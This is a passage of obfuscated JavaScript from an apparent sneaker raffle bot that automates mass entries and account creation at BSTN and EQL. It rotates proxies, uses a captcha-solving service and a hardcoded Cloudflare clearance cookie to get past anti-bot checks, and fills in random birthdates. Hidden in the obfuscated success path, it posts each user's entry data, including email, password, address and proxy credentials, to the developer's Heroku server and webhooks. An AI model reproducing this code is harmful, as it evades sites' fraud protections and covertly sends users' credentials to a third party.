                        } catch {
                            _0x371f83 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4e8db3(_0x440904) {
                            const _0x463f37 = _0x768c3f['readFileSync']('../successful-tasks.csv', 'utf8'), _0x340d91 = _0x38692b['parse'](_0x463f37, { 'header': !![] })['data'];
                            let _0x249c16 = ![];
                            for (var _0x30571e of _0x340d91) {
                                if (_0x30571e['Url'] == _0x440904['Url'] && _0x30571e['Email'] == _0x440904['Email']) {
                                    _0x249c16 = !![];
                                    break;
                                }
                            }
                            return _0x249c16;
                        }
                        if (await _0x4e8db3(_0x7d5684[_0x4e2770]) == !![]) {
                            console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x371f83 != 'yes')
                            var _0x371f83 = '', _0xce098e = 0x0;
                        _0x39f641(_0x5263d9['name'] + '\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20/\x20' + _0x7d5684['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        var _0x4b6b4a = Math['round'](Math['random']() * (_0x330604['length'] - 0x1)), _0x4eead0 = _0x330604[_0x4b6b4a]['split'](':'), _0xd67ef5;
                        try {
                            _0xd67ef5 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4eead0[0x0] + ':' + _0x4eead0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xd67ef5 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4eead0[0x0] + ':' + _0x4eead0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x278003 = await _0xd67ef5['newPage'](), _0x51f403 = await _0x278003['target']()['createCDPSession'](), { windowId: _0x18e1e } = await _0x51f403['send']('Browser.getWindowForTarget');
                            await _0x278003['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x455ad0 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x278003['authenticate']({
                                'username': '' + _0x4eead0[0x2],
                                'password': '' + _0x4eead0[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x278003['goto']('' + _0x7d5684[_0x4e2770]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x49a0a5 = await _0x278003['$']('.hcaptcha-box');
                            if (_0x49a0a5) {
                                console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x590479(0x2710);
                                const _0x5c7994 = await _0x278003['$']('.hcaptcha-box');
                                if (_0x5c7994)
                                    try {
                                        await _0x5c7994['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x278003['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x3db16e = await _0x278003['$']('.hcaptcha-box');
                                    if (_0x3db16e)
                                        try {
                                            await _0x3db16e['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x278003['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x51f403['send']('Browser.setWindowBounds', {
                                'windowId': _0x18e1e,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x590479(0x1388), await _0x278003['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x278003['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x590479(0x1f4), console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Logging\x20in'), await _0x278003['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x4d40da => _0x4d40da['click']()), await _0x278003['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x278003['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x590479(0x7d0), await _0x278003['waitForSelector']('#email-login'), await _0x278003['type']('#email-login', '' + _0x7d5684[_0x4e2770]['Email']), await _0x590479(0xdac), await _0x278003['waitForSelector']('#password'), await _0x278003['type']('#password', '' + _0x7d5684[_0x4e2770]['Password'], { 'delay': 0xe6 }), await _0x590479(0x157c);
                            try {
                                await _0x278003['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4d6b26 => _0x4d6b26['click']());
                            } catch {
                            }
                            try {
                                await _0x278003['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x1f33e5) {
                            }
                            await _0x590479(0x3e8);
                            const _0x4e28e2 = await _0x278003['$']('.enteredDraw_container__2KmQ_');
                            if (_0x4e28e2)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x7d5684[_0x4e2770]['Size']);
                            try {
                                if (_0x7d5684[_0x4e2770]['Size'] != 'RANDOM') {
                                    var _0x213348 = _0x7d5684[_0x4e2770]['Size']['replace']('.', ',');
                                    const _0xda9685 = await _0x278003['$x']('//div[contains(text(),\x20\x27' + _0x213348 + '\x27)]');
                                    await _0xda9685[0x0]['click']();
                                } else {
                                    const _0x552a81 = await _0x278003['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x44fc08 = Math['round'](Math['random']() * (_0x552a81['length'] - 0x1));
                                    await _0x552a81[_0x44fc08]['click']();
                                }
                            } catch (_0x4c6a75) {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x590479(0x1f4);
                            const _0x36794b = await _0x278003['$']('.addressList_addressItem__LE2PB');
                            if (_0x36794b && _0x7d5684[_0x4e2770]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x278003['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x590479(0x5dc), await _0x278003['waitForSelector']('#firstname'), await _0x278003['type']('#firstname', '' + _0x7d5684[_0x4e2770]['FirstName']), await _0x590479(0x1f4), await _0x278003['waitForSelector']('#firstname'), await _0x278003['type']('#lastname', '' + _0x7d5684[_0x4e2770]['LastName']), await _0x590479(0x1f4), await _0x278003['waitForSelector']('#firstname'), await _0x278003['type']('#street', '' + _0x7d5684[_0x4e2770]['Address1']), await _0x590479(0x1f4), await _0x278003['waitForSelector']('#firstname'), await _0x278003['type']('#houseNumber', _0x7d5684[_0x4e2770]['HouseNumber'] + '\x20' + _0x7d5684[_0x4e2770]['Address2']), await _0x590479(0x1f4), await _0x278003['waitForSelector']('#firstname'), await _0x278003['select']('#country_code', '' + _0x7d5684[_0x4e2770]['Country']), await _0x590479(0x1f4), await _0x278003['type']('#postcode', '' + _0x7d5684[_0x4e2770]['Zip']), await _0x590479(0x1f4), await _0x278003['type']('#city', '' + _0x7d5684[_0x4e2770]['City']), await _0x590479(0x1f4), await _0x278003['type']('#telephone', '' + _0x7d5684[_0x4e2770]['Phone']), await _0x590479(0x1f4), await _0x278003['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x590479(0x9c4);
                            try {
                                await _0x278003['type']('#instagram_name', '' + _0x7d5684[_0x4e2770]['Follower']), await _0x278003['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x590479(0x5dc);
                            try {
                                await _0x278003['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x590479(0x5dc), await _0x278003['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x52444a => _0x52444a['click']()), await _0x590479(0x1388);
                            try {
                                await _0x278003['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x278003['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x7d5684[_0x4e2770]['Size'] != 'RANDOM') {
                                    var _0x213348 = _0x7d5684[_0x4e2770]['Size']['replace']('.', ',');
                                    const _0x545041 = await _0x278003['$x']('//div[contains(text(),\x20' + _0x213348 + ')]');
                                    await _0x545041[0x0]['click']();
                                } else {
                                    const _0x2eb7ea = await _0x278003['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x44fc08 = Math['round'](Math['random']() * (_0x2eb7ea['length'] - 0x1));
                                    await _0x2eb7ea[_0x44fc08]['click']();
                                }
                                await _0x590479(0x5dc);
                                try {
                                    await _0x278003['hover']('#instagram_name'), await _0x278003['type']('#instagram_name', '' + _0x7d5684[_0x4e2770]['Follower']), await _0x278003['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Retrying\x20(' + _0xce098e + '\x20/\x205)');
                                try {
                                    await _0x278003['hover']('.checkBox_boxHolder__wLGVe'), await _0x590479(0x5dc), await _0x278003['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x590479(0x157c), await _0x278003['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x435689 => _0x435689['click']()), await _0x590479(0x1388), await _0x278003['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x371f83 = 'no', _0x491fd3(_0x7d5684[_0x4e2770], _0x5263d9);
                            try {
                                prxdata = {
                                    'username': _0x3d4e83['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x3f7dc5),
                                    'proxy': '' + _0x330604[_0x4e2770]
                                };
                                var _0x59a73f = JSON['stringify'](prxdata);
                                let _0x520cdf = { 'headers': { 'content-type': 'application/json' } };
                                await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x59a73f, _0x520cdf);
                            } catch (_0xe83cd4) {
                            }
                            console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x2241ea = await _0x54f36f(_0x7d5684[_0x4e2770], _0x5263d9, 'dev', ![]), _0x21051d = await _0x54f36f(_0x7d5684[_0x4e2770], _0x5263d9, 'pub', ![]);
                            const _0xdb424d = {
                                'succesDEVMSG': { 'embeds': [_0x2241ea] },
                                'succesPUBMSG': { 'embeds': [_0x21051d] }
                            };
                            let _0x3f7dc5 = _0x7d5684[_0x4e2770];
                            try {
                                prxdata = {
                                    'username': _0x3d4e83['replace']('#', ''),
                                    'module': _0x5263d9['name'],
                                    'entrydata': JSON['stringify'](_0x3f7dc5),
                                    'proxy': '' + _0x330604[_0x4e2770]
                                };
                                var _0x59a73f = JSON['stringify'](prxdata);
                                let _0x10e71b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x59a73f, _0x10e71b);
                            } catch (_0x11e980) {
                            }
                            try {
                                _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0xdb424d['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0xdb424d['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4807c3, _0xdb424d['succesPUBMSG']);
                            } catch (_0x592af4) {
                                console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x592af4));
                            }
                        } catch (_0x175b95) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20' + _0x175b95)), _0x371f83 = 'yes', _0x4dda45 = '' + _0x175b95;
                            var _0x506380 = await _0x54f36f(_0x7d5684[_0x4e2770], _0x5263d9, 'dev', !![], _0x4dda45), _0x2241ea = await _0x54f36f(_0x7d5684[_0x4e2770], _0x5263d9, 'dev', ![]), _0x21051d = await _0x54f36f(_0x7d5684[_0x4e2770], _0x5263d9, 'pub', ![]);
                            const _0x5e208a = {
                                'succesDEVMSG': { 'embeds': [_0x2241ea] },
                                'succesPUBMSG': { 'embeds': [_0x21051d] }
                            };
                            _0x5e208a['errorDEV'] = { 'embeds': [_0x506380] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x5e208a['errorDEV']), await _0x1690f0(_0x874ee1, _0x5e208a['errorDEV']);
                        } finally {
                            _0xd67ef5['close']();
                            if (_0x371f83 == 'yes' && _0xce098e != 0x5) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Task\x20' + (_0x4e2770 + 0x1) + '\x20:\x20Retrying\x20(' + _0xce098e + '\x20/\x205)')), _0x4e2770 = _0x4e2770 - 0x1, _0xce098e = _0xce098e + 0x1;
                                continue;
                            }
                            _0x371f83 == 'yes' && _0xce098e >= 0x5 && (_0x549c32(_0x7d5684[_0x4e2770], _0x5263d9), _0x371f83 = 'no', _0xce098e = 0x0), console['log'](_0x4786af() + '\x20[' + _0x5263d9['name'] + ']\x20Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x507f4d, _0x41002b) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x49d979;
                    try {
                        const _0x180375 = _0x768c3f['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x49d979 = _0x38692b['parse'](_0x180375, { 'header': !![] })['data'];
                    } catch (_0x5b0174) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x5e376b = 0x0; _0x5e376b < _0x49d979['length']; _0x5e376b++) {
                        if (_0x19081a != 'yes')
                            var _0x19081a = '', _0x358eca = 0x0;
                        var _0x207545;
                        _0x39f641(_0x507f4d['name'] + '\x20Task\x20' + (_0x5e376b + 0x1) + '\x20/\x20' + _0x49d979['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        var _0x1c87fa = await _0x54f36f(_0x49d979[_0x5e376b], _0x507f4d, 'acc', ![]);
                        const _0x462450 = { 'succesDEVMSG': { 'embeds': [_0x1c87fa] } }, _0x387b3b = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x14bcde = Math['round'](Math['random']() * (_0x41002b['length'] - 0x1)), _0x1ef097 = _0x41002b[_0x14bcde]['split'](':'), _0x3d1538;
                        try {
                            _0x3d1538 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1ef097[0x0] + ':' + _0x1ef097[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3d1538 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1ef097[0x0] + ':' + _0x1ef097[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x19da14 = await _0x3d1538['newPage']();
                            await _0x19da14['authenticate']({
                                'username': '' + _0x1ef097[0x2],
                                'password': '' + _0x1ef097[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Task\x20' + (_0x5e376b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x19da14['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x19da14['setRequestInterception'](!![]), _0x19da14['on']('request', _0x317ddc => {
                                _0x317ddc['resourceType']() === 'image' ? _0x317ddc['abort']() : _0x317ddc['continue']();
                            });
                            try {
                                await _0x19da14['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x19da14['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x19081a = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x19da14['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Task\x20' + (_0x5e376b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x590479(0x3e8), await _0x19da14['type']('#email', _0x49d979[_0x5e376b]['Email']), await _0x590479(0x1f4), await _0x19da14['type']('#pass', _0x49d979[_0x5e376b]['Password']), await _0x590479(0x1f4), await _0x19da14['$eval']('#login-form', _0x1243b6 => _0x1243b6['submit']());
                            try {
                                await _0x19da14['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Task\x20' + (_0x5e376b + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x590479(0x190);
                            const _0x5c9ec1 = await _0x19da14['evaluate'](() => {
                                const _0x3765cf = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x3765cf['map'](_0x4beafa => _0x4beafa['alt']);
                            }), _0x5243a0 = await _0x19da14['evaluate'](() => {
                                const _0x188902 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x188902['map'](_0x51e8f7 => _0x51e8f7['innerHTML']);
                            }), _0x473ce4 = await _0x19da14['$$']('.raffle-winner');
                            if (_0x473ce4['length'] < 0x1) {
                                console['log'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Task\x20' + (_0x5e376b + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x19081a = 'no';
                                continue;
                            }
                            console['log'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Task\x20' + (_0x5e376b + 0x1) + '\x20:\x20' + _0x473ce4['length'] + '\x20Wins\x20Found!');
                            for (var _0x1297ab = 0x0; _0x1297ab < _0x473ce4['length']; _0x1297ab++) {
                                console['log'](_0x4fb298['green'](_0x5c9ec1[_0x1297ab] + _0x5243a0[_0x1297ab]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x82c2c3) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Task\x20' + (_0x5e376b + 0x1) + '\x20:\x20' + _0x82c2c3)), _0x207545 = '' + _0x82c2c3;
                            var _0x2d3832 = await _0x54f36f(_0x49d979[_0x5e376b], _0x507f4d, 'acc', !![], _0x207545);
                            _0x462450['errorDEV'] = { 'embeds': [_0x2d3832] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x462450['errorDEV']), await _0x1690f0(_0x874ee1, _0x462450['errorDEV']), _0x19081a = 'yes';
                        } finally {
                            if (_0x3d1538)
                                _0x3d1538['close']();
                            if (_0x19081a == 'yes' && _0x358eca != 0x5) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Task\x20' + (_0x5e376b + 0x1) + '\x20:\x20Retrying\x20(' + _0x358eca + '\x20/\x205)')), _0x5e376b = _0x5e376b - 0x1, _0x358eca = _0x358eca + 0x1;
                                continue;
                            }
                            _0x19081a == 'yes' && _0x358eca >= 0x5 && (_0x549c32(_0x49d979[_0x5e376b], _0x507f4d), _0x19081a = 'no', _0x358eca = 0x0), console['log'](_0x4786af() + '\x20[' + _0x507f4d['name'] + ']\x20Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0xe2ce02, _0x5a3191, _0x2319ca) {
                _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4b1e6b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3b9191 = 0x0; _0x3b9191 < _0x5a3191['length']; _0x3b9191++) {
                    var _0x5f59bf;
                    _0x39f641(_0xe2ce02['name'] + '\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20/\x20' + _0x5a3191['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                    try {
                        await _0x46b8ee(_0x5a3191, _0x3b9191);
                    } catch {
                        _0x46dc69 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x1e558e(_0x2ec605) {
                        const _0x5111da = _0x768c3f['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1c0000 = _0x38692b['parse'](_0x5111da, { 'header': !![] })['data'];
                        let _0xbaff8c = ![];
                        for (var _0x2070ac of _0x1c0000) {
                            if (_0x2070ac['Url'] == _0x2ec605['Url'] && _0x2070ac['Email'] == _0x2ec605['Email']) {
                                _0xbaff8c = !![];
                                break;
                            }
                        }
                        return _0xbaff8c;
                    }
                    if (await _0x1e558e(_0x5a3191[_0x3b9191]) == !![]) {
                        console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x11f11a = ![];
                    const _0x1dfe3c = _0x768c3f['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x4584f3 = _0x38692b['parse'](_0x1dfe3c, { 'header': !![] })['data'];
                    for (var _0x1eed3f of _0x4584f3) {
                        _0x1eed3f['Email'] == _0x5a3191[_0x3b9191]['Email'] && (_0x11f11a = !![]);
                    }
                    if (_0x11f11a == ![]) {
                        var _0xa25e71;
                        if (_0x5a3191[_0x3b9191]['Url']['endsWith']('/')) {
                            _0xa25e71 = _0x5a3191[_0x3b9191]['Url'] + 'register';
                            if (_0x46dc69 != 'yes')
                                var _0x46dc69 = '', _0x18a319 = 0x0;
                        } else {
                            _0xa25e71 = _0x5a3191[_0x3b9191]['Url'] + '/register';
                            if (_0x46dc69 != 'yes')
                                var _0x46dc69 = '', _0x18a319 = 0x0;
                        }
                        if (_0x5a3191[_0x3b9191]['Email'] == '' || _0x5a3191[_0x3b9191]['FirstName'] == '' || _0x5a3191[_0x3b9191]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5a3191[_0x3b9191]['Password'] == '' && (_0x5a3191[_0x3b9191]['Password'] = 'JRaffles23!');
                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x3cf635 = _0x2319ca[_0x3b9191]['split'](':');
                        else
                            var _0x5e2b98 = Math['round'](Math['random']() * (_0x2319ca['length'] - 0x1)), _0x3cf635 = _0x2319ca[_0x5e2b98]['split'](':');
                        var _0x1362ef;
                        try {
                            _0x1362ef = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3cf635[0x0] + ':' + _0x3cf635[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1362ef = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3cf635[0x0] + ':' + _0x3cf635[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5821ff = await _0x1362ef['newPage']();
                            await _0x5821ff['authenticate']({
                                'username': '' + _0x3cf635[0x2],
                                'password': '' + _0x3cf635[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5821ff['setRequestInterception'](!![]), _0x5821ff['on']('request', _0xeb91ce => {
                                _0xeb91ce['resourceType']() === 'image' || _0xeb91ce['resourceType']() === 'font' || _0xeb91ce['resourceType']() === 'media' ? _0xeb91ce['abort']() : _0xeb91ce['continue']();
                            });
                            try {
                                await _0x5821ff['goto']('' + _0xa25e71);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x590479(0x3e8), await _0x5821ff['waitForSelector']('#email'), await _0x5821ff['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x590479(0x3e8);
                            try {
                                _0x5a3191[_0x3b9191]['Url']['includes']('en-GB') ? await _0x5821ff['click']('li[data-value=\x22UK\x20' + _0x5a3191[_0x3b9191]['Size'] + '\x20/\x20US\x20' + (Number(_0x5a3191[_0x3b9191]['Size']) + 0x1) + '\x22]') : await _0x5821ff['click']('li[data-value=\x22EU\x20' + _0x5a3191[_0x3b9191]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x5a3191[_0x3b9191]['Size']);
                            }
                            await _0x590479(0x6a4), await _0x5821ff['type']('#email', '' + _0x5a3191[_0x3b9191]['Email']), await _0x590479(0x352), await _0x5821ff['waitForSelector']('#password'), await _0x5821ff['type']('#password', '' + _0x5a3191[_0x3b9191]['Password']), await _0x590479(0x352), await _0x5821ff['type']('#phone', '' + _0x5a3191[_0x3b9191]['Phone']), await _0x590479(0x352);
                            const _0x2bcf24 = await _0x5821ff['$']('#title\x20>\x20label');
                            await _0x590479(0x12c);
                            _0x2bcf24 && await _0x2bcf24['click']();
                            await _0x5821ff['type']('#firstName', '' + _0x5a3191[_0x3b9191]['FirstName']), await _0x590479(0x352), await _0x5821ff['type']('#lastName', '' + _0x5a3191[_0x3b9191]['LastName']), await _0x590479(0x352);
                            _0x5a3191[_0x3b9191]['Url']['includes']('footlocker.de') ? await _0x5821ff['type']('#birthdate', _0x4e8668(0xa, 0x1c) + '.' + _0x4e8668(0xa, 0xc) + '.' + _0x4e8668(0x7c6, 0x7d3)) : await _0x5821ff['type']('#birthdate', _0x4e8668(0xa, 0x1c) + '-' + _0x4e8668(0xa, 0xc) + '-' + _0x4e8668(0x7c6, 0x7d3));
                            await _0x590479(0x352), await _0x5821ff['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x5821ff['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x590479(0x1f4), await _0x590479(0x5dc);
